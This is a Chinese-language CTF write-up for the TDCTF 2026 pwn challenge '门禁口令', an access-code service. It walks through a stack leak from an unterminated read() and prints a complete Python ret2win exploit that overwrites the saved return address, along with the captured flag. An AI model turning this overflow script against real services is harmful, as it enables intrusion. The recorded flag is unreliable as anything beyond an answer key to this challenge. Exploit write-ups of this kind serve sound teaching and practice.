---
title: "TDCTF 2026 Pwn 门禁口令 wp"
slug: "tdctf-2026-pwn-men-jin-kou-ling-wp"
date: 2026-11-23
updated: 2026-11-23
published: true
categories: ["TDCTF_2026"]
tags: ["TDCTF_2026", "Pwn"]
---

# TDCTF 2026 Pwn 门禁口令 wp

> 发布于 2026-11-23 06:45:00

题目是一个门禁口令校验服务，入口 `121.43.67.106:33411`，描述里写着「这个口令好像可以被你改写」。连上去之后界面很朴素：

```
=== 通达学院 门禁系统 ===
请输入门禁口令：
```

随手输入一段内容，程序会把输入原样回显，然后报错：

```
你输入的是：test
口令错误！
```

## 初步探测

先确认输入是怎么读的，以及长度上限：

| 测试 | 现象 | 结论 |
| --- | --- | --- |
| 发送 `abc\ndef\nghi\n` | 完整回显，换行也保留 | 不是 `scanf("%s")` / `fgets` |
| 发送 500 字节 | 只回显前 128 字节 | 读取上限 `0x80` |
| 发送不足 128 字节且不带换行 | 立即响应 | 单次 `read(0, buf, 128)` |
| 发送 128 字节后再发 `\n` | 回显 128 字节 | 第 129 字节留在 socket 里 |

所以核心逻辑大概是：

```c
char buf[?];
read(0, buf, 128);
printf("你输入的是：%s\n", buf);   // buf 没有被保证以 \0 结尾
// 与口令比较，失败则 puts("口令错误！");
```

## 信息泄露

`read()` 不会补 `\0`，`buf` 也没有被清零。如果只发送 n（n < 128）个字节，`printf("%s", buf)` 就会继续往后打印栈上的残留数据，直到遇到 `0x00` 为止——这就成了一个栈泄露。

逐字节改变输入长度并观察回显，可以还原出 `buf` 之后 128 字节的初始内容：

| 偏移 | 内容 | 含义 |
| --- | --- | --- |
| `0x00 - 0x2F`（0–47） | 0 | `char buf[48]` |
| `0x30 - 0x37`（48–55） | `0x00007ffd…`（栈地址） | saved RBP |
| `0x38 - 0x3F`（56–63） | `0x00000000004012e7` | saved RIP（返回地址） |

也就是说，发送 `A * 56` 时，从第 56 字节开始会泄露 8 个字节：

```
e7 12 40 00 00 00 00 00   ->  0x4012e7
```

多次连接这个值都不变，说明二进制**不是 PIE**，返回地址可以直接硬编码。于是栈布局是：

```
buf[48]        +0x00
saved RBP      +0x30   (48)
saved RIP      +0x38   (56)   <-- 溢出覆盖点
```

## 利用思路

程序虽然有一道口令校验，但完全不需要猜口令：`read` 一次读 128 字节，会一路覆盖到 saved RIP。只要把返回地址改成打印 flag 的函数，就绕开了校验（ret2win）。

由于是非 PIE，代码段固定在 `0x400000` 附近。扫描 `0x401000 - 0x401800` 这段 `.text`，把每个地址写到偏移 56 并观察输出，最终命中：

```
0x40120e   ->  打印 flag
```

`0x40120e` 和 `0x40120f` 都能打通，应该是函数入口附近的指令边界。

## EXP

```python
import socket, struct

HOST, PORT = "121.43.67.106", 33411
WIN = 0x40120e                      # 打印 flag 的函数

payload  = b"A" * 48                # char buf[48]
payload += b"B" * 8                 # saved RBP
payload += struct.pack("<Q", WIN)   # saved RIP -> win()
payload += b"C" * (128 - len(payload))  # 补满 128 字节（read 上限）

s = socket.create_connection((HOST, PORT), timeout=6)
s.sendall(payload)
s.shutdown(socket.SHUT_WR)

data = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    data += chunk
print(data.decode("utf-8", "replace"))
```

运行结果（连打三次一致）：

```
你输入的是：AAAA...AAAAAAAA\x0e\x12@
口令错误！
flag{3254f03e-2c91-4ebe-85ee-3cce48b79641}
```

## 小结

- 漏洞点：`read(0, buf, 128)` 读入 48 字节的栈缓冲区，并且没有 NUL 结尾。
- 泄露点：`printf("%s", buf)` 越界读到 saved RBP / saved RIP，确认了偏移和非 PIE。
- 利用：覆盖 saved RIP 为 `0x40120e`，ret2win 打印 flag。
- 所谓「口令可以被改写」，本质是**门禁的校验流程被栈溢出改写**，而不是去改口令字符串本身。

## Flag

```
flag{3254f03e-2c91-4ebe-85ee-3cce48b79641}
```
